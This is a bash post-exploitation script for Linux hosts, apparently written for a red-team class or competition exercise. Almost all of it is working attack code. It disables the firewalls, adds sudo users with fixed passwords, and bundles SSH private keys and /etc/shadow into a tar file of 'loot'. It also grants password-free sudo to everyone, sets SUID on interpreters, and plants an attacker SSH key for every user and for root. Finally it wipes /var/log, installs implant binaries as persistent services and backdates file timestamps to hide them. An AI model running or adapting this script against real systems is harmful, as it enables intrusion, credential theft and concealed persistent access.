#!/bin/bash

# Hacking? That's not very cash-money of you...
#
# This script must be run as root
# Its functions are as follows:
#	- Attempt to open firewall (U/C)
#	- Add sudo backup users
#	- Collect useful and sensitive files for export
#	- Ensure sudo doesnt need password
#	- SUID bins
#	- Drop prism bins
#	- Establish systemd persistence
#	- Timestomp

# Check sysv or systemd
pidof systemd && SYSD=1 || SYSD=0
if [[ $SYSD == 1 ]]; 
then
	echo "[!] SYSTEMD PRESENT"
else
	echo "[!] SYSTEMD NOT PRESENT"
fi

# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X &> /dev/null
    iptables -F &> /dev/null
	iptables -t nat -F &> /dev/null
	iptables -t nat -X &> /dev/null
	iptables -t mangle -F &> /dev/null
	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
	iptables -P FORWARD ACCEPT &> /dev/null
	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	
	## INSTALL STUFF ##
	yum -y install nmap vim &>/dev/null
	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X &> /dev/null
	iptables -F &> /dev/null
	iptables -t nat -F &> /dev/null
	iptables -t nat -X &> /dev/null
	iptables -t mangle -F &> /dev/null
	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
	iptables -P FORWARD ACCEPT &> /dev/null
	iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
	useradd -G sudo jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G sudo tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G sudo bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null

	## INSTALL STUFF ##
	apt -y install nmap vim &>/dev/null


fi

echo "[!] FIREWALL & USER finished"

#===============================================================================
				# COLLECT FOR EXPORT #
#===============================================================================

mkdir -p /tmp/l

# GRAB SSH KEYS
find / -name "*id_rsa*" 2> /dev/null > /tmp/t
mkdir -p /tmp/jg
for k in $(cat /tmp/t); do
       cp $k /tmp/jg/$(echo "$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
done
tar -cvf /tmp/l/keys.tar /tmp/jg
mv /tmp/t /tmp/l/
rm -rf /tmp/jg

# COLLECT SENSITIVE FILES
cp /etc/passwd /tmp/l/p
cp /etc/shadow /tmp/l/s
cp /etc/group /tmp/l/g
cp /etc/ssh/sshd_config /tmp/l/sh
cp /etc/sudoers /tmp/l/su

# COLLECT HISTORY
#mkdir -p /tmp/l/bh
#find /home -iname ".*history" 2>/dev/null > /tmp/b
#for hist in `cat /tmp/b`; do
#	cp $hist /tmp/bh/$(echo "st$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
#done
#mv /tmp/b /tmp/l/

tar -cvf /tmp/l.tar /tmp/l

echo "[!] LOOT finished"
echo "[!] Don't forget to grab loot from /tmp/l.tar"

#===============================================================================
			# CONFIGURATIONS #
#===============================================================================

# Enable Root login over ssh
if [[ -f /etc/ssh/sshd_config ]]
then
	sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
fi

mv /tmp/asdasd /etc/ssh/sshd_config
rm -f /tmp/asdasd

# Enable sudowoodo
if grep -Fxq "ALL ALL=(ALL:ALL) NOPASSWD:ALL" /etc/sudoers
then
	echo "" >> /etc/sudoers
else
	for i in {1..200}
	do
		echo "" >> /etc/sudoers
	done
	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
fi

echo "[!] CONFIG finished"

#===============================================================================
				# SUID #
#===============================================================================

# FIND
if [[ -f /bin/find ]]
then
	sh -c 'chmod 7777 /bin/find'
fi

if [[ -f /usr/bin/find ]]
then
	sh -c 'chmod 7777 /usr/bin/find'
fi

# VIM
if [[ -f /bin/vim ]]
then
	sh -c 'chmod 7777 /bin/vim'
fi

if [[ -f /usr/bin/vim ]]
then
	sh -c 'chmod 7777 /usr/bin/vim'
fi

# PYTHON
if [[ -f /bin/python ]]
then
	sh -c 'chmod 7777 /bin/python'
fi

if [[ -f /bin/python3 ]]
then
	sh -c 'chmod 7777 /bin/python3'
fi

if [[ -f /usr/bin/python ]]
then
	sh -c 'chmod 7777 /usr/bin/python'
fi

if [[ -f /usr/bin/python3 ]]
then
	sh -c 'chmod 7777 /usr/bin/python3'
fi

# PERL
if [[ -f /bin/perl ]]
then
	sh -c 'chmod 7777 /bin/perl'
fi

if [[ -f /usr/bin/perl ]]
then
	sh -c 'chmod 7777 /usr/bin/perl'
fi

echo "[!] SUID finished"

#===============================================================================
				# DROPPER #
#===============================================================================

# DROP SSH KEYS

## USERS
for d in /home/*; do

	if [ -d "$d"  ];
	then
		if ! [ -d "/home/$d/.ssh"  ];
		then 
			mkdir -p /home/$d/.ssh
			chmod 700 /home/$d/.ssh 
		fi 

		if ! [ -f "/home/$d/.ssh/authorized_keys" ];
		then
			touch /home/$d/.ssh/authorized_keys
			chmod 644 /home/$d/.ssh/authorized_keys
		fi
		
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
	fi
done

## ROOT
if ! [ -d "/root/.ssh"  ];
then 
	mkdir -p /root/.ssh
	chmod 700 /root/.ssh 
fi 

if ! [ -f "/root/.ssh/authorized_keys" ];
then
	touch /root/.ssh/authorized_keys
	chmod 644 /root/.ssh/authorized_keys
fi

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /root/.ssh/authorized_keys

echo "[!] SSHKEYS dropped"



# LOGGER MCLOGGERSON MEANY PANTS MCGEE

find /var/log -type f -delete
cp ./pwn/l3ts_g3t_fUnKii /var/log/

# PRISM
chmod 7700 ./bin/fsdisk
cp ./bin/fsdisk /sbin/

chmod 7700 ./bin/devutil
cp ./bin/devutil /usr/local/

chmod 7700 ./bin/update-util
cp ./bin/update-util /usr/bin/

echo "[!] PRISM dropped"


if [[ SYSD == 1 ]]; then

	# SYSTEMD PERSISTENCE
	chmod 777 ./systemd/developer-utility.service
	cp ./systemd/developer-utility.service /etc/systemd/system/
	systemctl start developer-utility.service
	systemctl enable developer-utility.service

	chmod 777 ./systemd/update-utility.service
	cp ./systemd/update-utility.service /etc/systemd/system/
	systemctl start update-utility.service
	systemctl enable update-utility.service

	chmod 777 ./systemd/filesys.service
	cp ./systemd/filesys.service /etc/systemd/system/
	systemctl start filesys.service
	systemctl enable filesys.service

	echo "[!] SYSTEMD set"
else
	chmod 777 ./upstart/fsdisk.conf
	cp ./upstart/fsdisk.conf /etc/init/
	initctl start fsdisk

	chmod 777 ./upstart/devutil.conf
	cp ./upstart/devutil.conf /etc/init/
	initctl start devutil

	chmod 777 ./upstart/update-util.conf
	cp ./upstart/update-util.conf /etc/init/
	initctl start update-util
fi


#===============================================================================
				# TIMESTOMP #
#===============================================================================

# SSH
touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config

touch -a --date "2020-3-20 20:51:30" /etc/ssh
touch -m --date "2020-3-20 20:51:30" /etc/ssh

for target in `find /home | grep .ssh`; do
	touch -a --date "2020-1-27 13:06:01" $target
	touch -m --date "2020-1-27 13:06:01" $target
done

# for target in `find /home`; do
# 	touch -a --date "2020-1-27 13:06:01" $target
# 	touch -m --date "2020-1-27 13:06:01" $target
# done

touch -a --date "2020-3-20 20:51:30" /home
touch -m --date "2020-3-20 20:51:30" /home


# ADMIN
touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

touch -a --date "2020-11-20 20:51:30" /etc/passwd
touch -m --date "2020-11-20 20:51:30" /etc/passwd

touch -a --date "2020-11-20 20:51:30" /etc/shadow
touch -m --date "2020-11-20 20:51:30" /etc/shadow

touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

# IMPLANTS
touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk

touch -a --date "2020-11-30 20:51:30" /sbin
touch -m --date "2020-11-30 20:51:30" /sbin

touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
touch -m --date "2016-11-21 20:51:30" /usr/local/devutil

touch -a --date "2016-11-21 20:51:30" /usr/local
touch -m --date "2016-11-21 20:51:30" /usr/local

touch -a --date "2020-11-30 20:51:30" /usr/bin/update-util
touch -m --date "2020-11-30 20:51:30" /usr/bin/update-util

touch -a --date "2020-11-30 20:51:30" /usr/bin
touch -m --date "2020-11-30 20:51:30" /usr/bin

touch -a --date "2016-8-10 20:51:30" /usr
touch -m --date "2016-8-10 20:51:30" /usr



if [[ SYSD == 1 ]]; then
	# SYSTEMD
	touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/update-utility.service
	touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/update-utility.service

	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service

	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service

	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/

	touch -a --date "2019-3-20 20:51:30" /etc/systemd/
	touch -m --date "2019-3-20 20:51:30" /etc/systemd/
else
	# UPSTART
	touch -a --date "2020-5-20 09:54:30" /etc/init/fsdisk.conf
	touch -m --date "2020-5-20 09:54:30" /etc/init/fsdisk.conf

	touch -a --date "2020-5-20 09:54:30" /etc/init/devutil.conf
	touch -m --date "2020-5-20 09:54:30" /etc/init/devutil.conf

	touch -a --date "2020-5-20 09:54:30" /etc/init/update-util.conf
	touch -m --date "2020-5-20 09:54:30" /etc/init/update-util.conf

	touch -a --date "2018-5-14 09:54:30" /etc/init
	touch -m --date "2018-5-14 09:54:30" /etc/init
fi

touch -a --date "2020-11-30 20:51:30" /etc
touch -m --date "2020-11-30 20:51:30" /etc


echo "[!] TIMESTOMPd"

# CLEANUP
rm -rf ./bin
rm -rf ./pwn
rm -rf ./upstart
rm -rf ./systemd
rm -rf ./config.sh

echo "[!] CLEANED"
echo "[!] REBOOTING"

reboot

exit 0
